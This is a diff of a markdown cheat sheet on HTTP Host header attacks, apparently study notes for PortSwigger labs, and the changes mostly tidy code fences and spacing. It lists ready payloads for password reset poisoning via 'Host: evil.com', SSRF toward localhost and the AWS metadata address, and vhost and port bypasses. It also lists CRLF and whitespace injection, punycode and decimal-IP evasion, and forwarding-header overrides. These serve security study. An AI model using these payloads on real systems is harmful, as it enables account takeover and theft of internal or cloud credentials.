@@ -533,7 +533,6 @@ X-HTTP-Host-Override: evil.com
 Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.
 
 # 📌 **2.2 Password Reset Poisoning**
-
 ```
 POST /forgot HTTP/1.1
 Host: evil.com
@@ -542,66 +541,30 @@ Content-Type: application/json
 {"email":"victim@example.com"}
 ```
 # 📌 **2.4 SSRF Using Host Header**
-
 ```
 Host: 127.0.0.1
-```
-```
 Host: 169.254.169.254   # AWS metadata
-```
-```
 Host: localhost
 ```
----
 # 📌 **2.5 Admin Panel / VHost Bypass**
 ```
 Host: admin.target.com
-```
-```
 Host: internal.target.local
-```
-```
 Host: staging.target.com
 ```
----
-
 # 🔥 **3.3 Port-Based Bypass**
 
 ```
 Host: target.com:443
-```
-
-```
 Host: target.com:80
-```
-
-```
 Host: target.com:8080
-```
-
-```
 Host: target.com:*
 ```
-
-These bypass strict host comparisons.
-
----
-
 # 🔥 **3.4 Whitespace / Tab Injection Bypass**
-
 ```
 Host: evil.com%20
-```
-
-```
 Host: evil.com%0d%0aInjected: yes
-```
-
-```
 Host: evil.com\t
-```
-
-```
 Host: evil.com\r\nX-Test: 123
 punycode  Host: xn--evil-9sa.com
 Using IP-long form  Host: 2130706433     # 127.0.0.1 in decimal
@@ -620,7 +583,6 @@ Origin: http://evil.com
 Forwarded: host=evil.com
 X-Forwarded-Host: internal-admin
 ```
-
 ---
 
 | Tool | Description |
